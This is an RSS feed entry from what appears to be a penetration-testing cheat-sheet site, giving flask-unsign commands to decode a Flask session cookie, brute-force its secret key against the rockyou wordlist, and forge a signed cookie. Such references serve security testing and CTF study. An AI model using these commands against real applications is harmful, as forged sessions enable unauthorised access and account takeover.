channel.title: Cookie on TLDRBins
channel.description: Recent content in Cookie on TLDRBins

item.title: Flask Cookie
item.description: Cookie Tools flask-unsign # Install pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie <COOKIE> # Brute force secret key flask-unsign --unsign --cookie <COOKIE> -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie <COOKIE_DATA> --secret <SECRET>
